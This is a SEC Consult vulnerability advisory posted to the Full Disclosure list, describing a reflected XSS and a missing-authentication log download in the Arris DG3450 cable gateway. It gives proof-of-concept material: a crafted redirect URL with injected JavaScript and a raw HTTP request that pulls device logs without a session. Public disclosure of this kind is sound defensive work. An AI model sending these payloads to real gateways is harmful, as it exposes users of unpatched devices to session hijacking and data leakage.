---
title: SEC Consult SA-20230306-0 :: Multiple Vulnerabilities in Arris DG3450 Cable Gateway
url: https://seclists.org/fulldisclosure/2023/Mar/4
source: Full Disclosure
date: 2023-03-08
fetch_date: 2025-10-04T08:57:37.713181
---

# SEC Consult SA-20230306-0 :: Multiple Vulnerabilities in Arris DG3450 Cable Gateway

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20230306-0 :: Multiple Vulnerabilities in Arris DG3450 Cable Gateway

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>
*Date*: Mon, 6 Mar 2023 10:58:09 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20230306-0 >
=======================================================================
               title: Multiple Vulnerabilities
             product: Arris DG3450 Cable Gateway
  vulnerable version: AR01.02.056.18_041520_711.NCS.10
       fixed version: -
          CVE number: CVE-2023-27571, CVE-2023-27572
              impact: medium
            homepage: https://www.commscope.com
               found: 2022-10-21
                  by: S. Robertz (Office Vienna)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
Arris has been aquired by CommScope in 2019.

"At CommScope we push the boundaries of communications technology to
create the world’s most advanced networks. We design, manufacture,
install and support the hardware infrastructure and software
intelligence that enable our digital society to interact and thrive.
Working with customers, we advance broadband, enterprise and wireless
networks to power progress and create lasting connections.

Across the globe, our people and solutions are redefining connectivity,
solving today’s challenges and driving the innovation that will meet
the needs of what’s next."

Source: https://www.commscope.com/about-us/

Business recommendation:
------------------------
The vendor did not reply to any of our communication attempts. The security
issues have not been fixed. Users of this product are urged to contact their
support representative and request the vulnerabilities to be fixed.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Reflected Cross-Site-Scripting Vulnerability (CVE-2023-27572)
An attacker can execute arbitrary JavaScript code in the context of the
victim's session, thus perform all actions, exfiltrate information, etc. In
order to exploit this vulnerability the attacker will have to trick the user
into visiting a manipulated URL.

2) Missing Authentication (CVE-2023-27572)
Logfiles can be downloaded without prior authentication, once the correct URL
is known. This allows an attacker to gain further information about the usage
of the device.

Proof of concept:
-----------------
1) Reflected Cross-Site-Scripting Vulnerability (CVE-2023-27572)
The following URL has to be visited by the victim in order to execute arbitrary
JavaScript code.

http://$IP/https_redirect.php?page=%22;alert(document.domain);var%20dummy=%22

2) Missing Authentication (CVE-2023-27572)
The following HTTP request will return the log file of the device without
checking for a valid session cookie.

-------------------
GET /troubleshooting_logs_download.php?log_type=system&time_frame=today HTTP/1.1
Host: $IP

HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
Set-Cookie: PHPSESSID=38b5a65ba1a4477e29efd73ee1e01554; path=/; HttpOnly
X-XSS-Protection: 1; mode=block
strict-transport-security: max-age=600; includeSubDomains
Server: ARRIS Server
X-Frame-Options: DENY
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; worker-src blob:
Cache-control: private
Pragma: private
Expires: 0
Content-type: text/plain;charset=utf-8
Content-Disposition: attachment; filename="troubleshooting_logs_system_today.txt"
Content-Transfer-Encoding: binary
Accept-Ranges: bytes
Content-Length: 437
Date: Tue, 21 Jun 2022 20:51:07 GMT

GUI: User:admin login
        06/15/2022 22:46:56     Notice

GUI: User:admin logout
        06/15/2022 22:42:14     Notice

GUI: User:admin logout
        06/15/2022 22:41:26     Notice

GUI: User:admin logout
        06/15/2022 22:41:06     Notice

GUI: User:admin logout
        06/15/2022 22:40:47     Notice

GUI: User:admin login
        06/15/2022 22:33:22     Notice

GUI: User:admin logout
        06/15/2022 22:31:51     Notice
-------------------

Vulnerable / tested versions:
-----------------------------
The vulnerabilities have been tested on the following device / firmware:
* Arris DG3450 with software version AR01.02.056.18_041520_711.NCS.10

Vendor contact timeline:
------------------------
2022-11-22: Contacting vendor through TAC.helpdesk () commscope com; no response.
2022-12-05: Asking for security contact through @Arris Twitter social media
             No response. Received "You can no longer send messages to this person"
             after initial message.
2022-12-05: Contacting vendor via privacycontact () commscope com; no response.
2023-01-24: Contacting vendor again via privacycontact () commscope com and
             TAC.helpdesk () commscope com; no response
2023-03-02: Requesting CVE numbers.
2023-03-06: Release of security advisory.

Solution:
---------
The vendor did not reply to any of our communication attempts. The security
issues have not been fixed. Users of this product are urged to contact their
support representative and request the vulnerabilities to be fixed.

Workaround:
-----------
None

Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://sec-consult.com/career/

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://sec-consult.com/contact/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult

EOF S. Robertz / @2023
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16....